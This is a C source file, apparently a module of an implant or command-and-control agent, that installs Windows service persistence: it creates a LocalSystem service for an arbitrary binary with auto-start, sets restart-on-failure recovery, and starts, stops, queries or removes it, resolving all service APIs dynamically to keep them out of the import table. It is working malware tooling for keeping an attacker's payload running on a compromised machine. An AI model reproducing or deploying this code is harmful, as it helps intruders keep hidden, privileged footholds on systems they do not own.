#include "PersistService.h"
#include "utils.h"
#include "ntdll.h"

// Install service persistence
BOOL InstallServicePersist(LPCSTR serviceName, LPCSTR displayName, LPCSTR targetPath, DWORD startType) {
    if (!serviceName || !targetPath) return FALSE;

    // Services require admin privileges
    if (!IsElevate()) return FALSE;

    // Open service manager
    typedef SC_HANDLE(WINAPI* OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
    typedef SC_HANDLE(WINAPI* CreateServiceA_t)(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
    typedef BOOL(WINAPI* CloseServiceHandle_t)(SC_HANDLE);

    OpenSCManagerA_t pOpenSCManagerA = (OpenSCManagerA_t)GetProcAddress(
        SysModules->Advapi32, "OpenSCManagerA");
    CreateServiceA_t pCreateServiceA = (CreateServiceA_t)GetProcAddress(
        SysModules->Advapi32, "CreateServiceA");
    CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(
        SysModules->Advapi32, "CloseServiceHandle");

    if (!pOpenSCManagerA || !pCreateServiceA || !pCloseServiceHandle) {
        return FALSE;
    }

    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return FALSE;

    // Build service path
    CHAR servicePath[MAX_PATH * 2] = { 0 };
    ApiWin->snprintf(servicePath, sizeof(servicePath), "\"%s\"", targetPath);

    // Create service
    SC_HANDLE hService = pCreateServiceA(
        hSCManager,
        serviceName,
        displayName ? displayName : serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        startType,
        SERVICE_ERROR_NORMAL,
        servicePath,
        NULL,   // No load ordering group
        NULL,   // No tag ID
        NULL,   // No dependencies
        NULL,   // LocalSystem account
        NULL    // No password
    );

    BOOL result = FALSE;
    if (hService) {
        result = TRUE;
        pCloseServiceHandle(hService);
    }

    pCloseServiceHandle(hSCManager);
    return result;
}

// Install service with extended configuration
BOOL InstallServicePersistEx(PSERVICE_PERSIST_CONFIG pConfig) {
    if (!pConfig || !pConfig->serviceName || !pConfig->targetPath) {
        return FALSE;
    }

    // Services require admin
    if (!IsElevate()) return FALSE;

    typedef SC_HANDLE(WINAPI* OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
    typedef SC_HANDLE(WINAPI* CreateServiceA_t)(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
    typedef BOOL(WINAPI* ChangeServiceConfig2A_t)(SC_HANDLE, DWORD, LPVOID);
    typedef BOOL(WINAPI* CloseServiceHandle_t)(SC_HANDLE);

    OpenSCManagerA_t pOpenSCManagerA = (OpenSCManagerA_t)GetProcAddress(
        SysModules->Advapi32, "OpenSCManagerA");
    CreateServiceA_t pCreateServiceA = (CreateServiceA_t)GetProcAddress(
        SysModules->Advapi32, "CreateServiceA");
    ChangeServiceConfig2A_t pChangeServiceConfig2A = (ChangeServiceConfig2A_t)GetProcAddress(
        SysModules->Advapi32, "ChangeServiceConfig2A");
    CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(
        SysModules->Advapi32, "CloseServiceHandle");

    if (!pOpenSCManagerA || !pCreateServiceA) {
        return FALSE;
    }

    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return FALSE;

    // Build service path
    CHAR servicePath[MAX_PATH * 2] = { 0 };
    if (pConfig->arguments && strlen(pConfig->arguments) > 0) {
        ApiWin->snprintf(servicePath, sizeof(servicePath), "\"%s\" %s",
            pConfig->targetPath, pConfig->arguments);
    }
    else {
        ApiWin->snprintf(servicePath, sizeof(servicePath), "\"%s\"", pConfig->targetPath);
    }

    // Create service
    SC_HANDLE hService = pCreateServiceA(
        hSCManager,
        pConfig->serviceName,
        pConfig->displayName ? pConfig->displayName : pConfig->serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        pConfig->startType ? pConfig->startType : SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        servicePath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    BOOL result = FALSE;
    if (hService) {
        result = TRUE;

        // Set description if provided
        if (pConfig->description && pChangeServiceConfig2A) {
            SERVICE_DESCRIPTIONA desc = { 0 };
            desc.lpDescription = (LPSTR)pConfig->description;
            pChangeServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, &desc);
        }

        pCloseServiceHandle(hService);
    }

    pCloseServiceHandle(hSCManager);
    return result;
}

// Remove service
BOOL RemoveServicePersist(LPCSTR serviceName) {
    if (!serviceName) return FALSE;

    if (!IsElevate()) return FALSE;

    typedef SC_HANDLE(WINAPI* OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
    typedef SC_HANDLE(WINAPI* OpenServiceA_t)(SC_HANDLE, LPCSTR, DWORD);
    typedef BOOL(WINAPI* DeleteService_t)(SC_HANDLE);
    typedef BOOL(WINAPI* CloseServiceHandle_t)(SC_HANDLE);

    OpenSCManagerA_t pOpenSCManagerA = (OpenSCManagerA_t)GetProcAddress(
        SysModules->Advapi32, "OpenSCManagerA");
    OpenServiceA_t pOpenServiceA = (OpenServiceA_t)GetProcAddress(
        SysModules->Advapi32, "OpenServiceA");
    DeleteService_t pDeleteService = (DeleteService_t)GetProcAddress(
        SysModules->Advapi32, "DeleteService");
    CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(
        SysModules->Advapi32, "CloseServiceHandle");

    if (!pOpenSCManagerA || !pOpenServiceA || !pDeleteService) {
        return FALSE;
    }

    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) return FALSE;

    SC_HANDLE hService = pOpenServiceA(hSCManager, serviceName, DELETE);
    if (!hService) {
        pCloseServiceHandle(hSCManager);
        return FALSE;
    }

    BOOL result = pDeleteService(hService);

    pCloseServiceHandle(hService);
    pCloseServiceHandle(hSCManager);

    return result;
}

// Check if service exists
BOOL CheckServiceExist(LPCSTR serviceName) {
    if (!serviceName) return FALSE;

    typedef SC_HANDLE(WINAPI* OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
    typedef SC_HANDLE(WINAPI* OpenServiceA_t)(SC_HANDLE, LPCSTR, DWORD);
    typedef BOOL(WINAPI* CloseServiceHandle_t)(SC_HANDLE);

    OpenSCManagerA_t pOpenSCManagerA = (OpenSCManagerA_t)GetProcAddress(
        SysModules->Advapi32, "OpenSCManagerA");
    OpenServiceA_t pOpenServiceA = (OpenServiceA_t)GetProcAddress(
        SysModules->Advapi32, "OpenServiceA");
    CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(
        SysModules->Advapi32, "CloseServiceHandle");

    if (!pOpenSCManagerA || !pOpenServiceA) {
        return FALSE;
    }

    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) return FALSE;

    SC_HANDLE hService = pOpenServiceA(hSCManager, serviceName, SERVICE_QUERY_STATUS);

    pCloseServiceHandle(hSCManager);

    if (hService) {
        pCloseServiceHandle(hService);
        return TRUE;
    }

    return FALSE;
}

// Start service
BOOL StartServicePersist(LPCSTR serviceName) {
    if (!serviceName) return FALSE;

    typedef SC_HANDLE(WINAPI* OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
    typedef SC_HANDLE(WINAPI* OpenServiceA_t)(SC_HANDLE, LPCSTR, DWORD);
    typedef BOOL(WINAPI* StartServiceA_t)(SC_HANDLE, DWORD, LPCSTR*);
    typedef BOOL(WINAPI* CloseServiceHandle_t)(SC_HANDLE);

    OpenSCManagerA_t pOpenSCManagerA = (OpenSCManagerA_t)GetProcAddress(
        SysModules->Advapi32, "OpenSCManagerA");
    OpenServiceA_t pOpenServiceA = (OpenServiceA_t)GetProcAddress(
        SysModules->Advapi32, "OpenServiceA");
    StartServiceA_t pStartServiceA = (StartServiceA_t)GetProcAddress(
        SysModules->Advapi32, "StartServiceA");
    CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(
        SysModules->Advapi32, "CloseServiceHandle");

    if (!pOpenSCManagerA || !pOpenServiceA || !pStartServiceA) {
        return FALSE;
    }

    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) return FALSE;

    SC_HANDLE hService = pOpenServiceA(hSCManager, serviceName, SERVICE_START);
    if (!hService) {
        pCloseServiceHandle(hSCManager);
        return FALSE;
    }

    BOOL result = pStartServiceA(hService, 0, NULL);

    pCloseServiceHandle(hService);
    pCloseServiceHandle(hSCManager);

    return result;
}

// Stop service
BOOL StopServicePersist(LPCSTR serviceName) {
    if (!serviceName) return FALSE;

    typedef SC_HANDLE(WINAPI* OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
    typedef SC_HANDLE(WINAPI* OpenServiceA_t)(SC_HANDLE, LPCSTR, DWORD);
    typedef BOOL(WINAPI* ControlService_t)(SC_HANDLE, DWORD, LPSERVICE_STATUS);
    typedef BOOL(WINAPI* CloseServiceHandle_t)(SC_HANDLE);

    OpenSCManagerA_t pOpenSCManagerA = (OpenSCManagerA_t)GetProcAddress(
        SysModules->Advapi32, "OpenSCManagerA");
    OpenServiceA_t pOpenServiceA = (OpenServiceA_t)GetProcAddress(
        SysModules->Advapi32, "OpenServiceA");
    ControlService_t pControlService = (ControlService_t)GetProcAddress(
        SysModules->Advapi32, "ControlService");
    CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(
        SysModules->Advapi32, "CloseServiceHandle");

    if (!pOpenSCManagerA || !pOpenServiceA || !pControlService) {
        return FALSE;
    }

    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) return FALSE;

    SC_HANDLE hService = pOpenServiceA(hSCManager, serviceName, SERVICE_STOP);
    if (!hService) {
        pCloseServiceHandle(hSCManager);
        return FALSE;
    }

    SERVICE_STATUS status = { 0 };
    BOOL result = pControlService(hService, SERVICE_CONTROL_STOP, &status);

    pCloseServiceHandle(hService);
    pCloseServiceHandle(hSCManager);

    return result;
}

// Query service status
BOOL QueryServiceStatusPersist(LPCSTR serviceName, SERVICE_STATUS* pStatus) {
    if (!serviceName || !pStatus) return FALSE;

    typedef SC_HANDLE(WINAPI* OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
    typedef SC_HANDLE(WINAPI* OpenServiceA_t)(SC_HANDLE, LPCSTR, DWORD);
    typedef BOOL(WINAPI* QueryServiceStatus_t)(SC_HANDLE, LPSERVICE_STATUS);
    typedef BOOL(WINAPI* CloseServiceHandle_t)(SC_HANDLE);

    OpenSCManagerA_t pOpenSCManagerA = (OpenSCManagerA_t)GetProcAddress(
        SysModules->Advapi32, "OpenSCManagerA");
    OpenServiceA_t pOpenServiceA = (OpenServiceA_t)GetProcAddress(
        SysModules->Advapi32, "OpenServiceA");
    QueryServiceStatus_t pQueryServiceStatus = (QueryServiceStatus_t)GetProcAddress(
        SysModules->Advapi32, "QueryServiceStatus");
    CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(
        SysModules->Advapi32, "CloseServiceHandle");

    if (!pOpenSCManagerA || !pOpenServiceA || !pQueryServiceStatus) {
        return FALSE;
    }

    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) return FALSE;

    SC_HANDLE hService = pOpenServiceA(hSCManager, serviceName, SERVICE_QUERY_STATUS);
    if (!hService) {
        pCloseServiceHandle(hSCManager);
        return FALSE;
    }

    BOOL result = pQueryServiceStatus(hService, pStatus);

    pCloseServiceHandle(hService);
    pCloseServiceHandle(hSCManager);

    return result;
}

// Set service description
BOOL SetServiceDescription(HANDLE hService, LPCSTR description) {
    if (!hService || !description) return FALSE;

    typedef BOOL(WINAPI* ChangeServiceConfig2A_t)(SC_HANDLE, DWORD, LPVOID);
    ChangeServiceConfig2A_t pChangeServiceConfig2A = (ChangeServiceConfig2A_t)GetProcAddress(
        SysModules->Advapi32, "ChangeServiceConfig2A");

    if (!pChangeServiceConfig2A) return FALSE;

    SERVICE_DESCRIPTIONA desc = { 0 };
    desc.lpDescription = (LPSTR)description;

    return pChangeServiceConfig2A((SC_HANDLE)hService, SERVICE_CONFIG_DESCRIPTION, &desc);
}

// Configure service recovery
BOOL ConfigureServiceRecovery(LPCSTR serviceName) {
    if (!serviceName) return FALSE;

    if (!IsElevate()) return FALSE;

    typedef SC_HANDLE(WINAPI* OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
    typedef SC_HANDLE(WINAPI* OpenServiceA_t)(SC_HANDLE, LPCSTR, DWORD);
    typedef BOOL(WINAPI* ChangeServiceConfig2A_t)(SC_HANDLE, DWORD, LPVOID);
    typedef BOOL(WINAPI* CloseServiceHandle_t)(SC_HANDLE);

    OpenSCManagerA_t pOpenSCManagerA = (OpenSCManagerA_t)GetProcAddress(
        SysModules->Advapi32, "OpenSCManagerA");
    OpenServiceA_t pOpenServiceA = (OpenServiceA_t)GetProcAddress(
        SysModules->Advapi32, "OpenServiceA");
    ChangeServiceConfig2A_t pChangeServiceConfig2A = (ChangeServiceConfig2A_t)GetProcAddress(
        SysModules->Advapi32, "ChangeServiceConfig2A");
    CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(
        SysModules->Advapi32, "CloseServiceHandle");

    if (!pOpenSCManagerA || !pOpenServiceA || !pChangeServiceConfig2A) {
        return FALSE;
    }

    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) return FALSE;

    SC_HANDLE hService = pOpenServiceA(hSCManager, serviceName, SERVICE_CHANGE_CONFIG);
    if (!hService) {
        pCloseServiceHandle(hSCManager);
        return FALSE;
    }

    // Configure recovery: restart on failure
    SERVICE_FAILURE_ACTIONSA failActions = { 0 };
    failActions.dwResetPeriod = 86400; // Reset fail counter after 24 hours
    failActions.cActions = 3;
    failActions.lpsaActions = NULL;

    // Allocate actions
    typedef struct _SC_ACTION {
        SC_ACTION_TYPE Type;
        DWORD Delay;
    } SC_ACTION;

    SC_ACTION* actions = (SC_ACTION*)MemAllocLocal(sizeof(SC_ACTION) * 3);
    if (actions) {
        actions[0].Type = SC_ACTION_RESTART;
        actions[0].Delay = 60000; // Restart after 1 minute
        actions[1].Type = SC_ACTION_RESTART;
        actions[1].Delay = 120000; // Restart after 2 minutes
        actions[2].Type = SC_ACTION_RESTART;
        actions[2].Delay = 300000; // Restart after 5 minutes

        failActions.lpsaActions = (LPSC_ACTION)actions;
    }

    BOOL result = pChangeServiceConfig2A(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &failActions);

    if (actions) {
        MemFreeLocal((LPVOID*)&actions, sizeof(SC_ACTION) * 3);
    }

    pCloseServiceHandle(hService);
    pCloseServiceHandle(hSCManager);

    return result;
}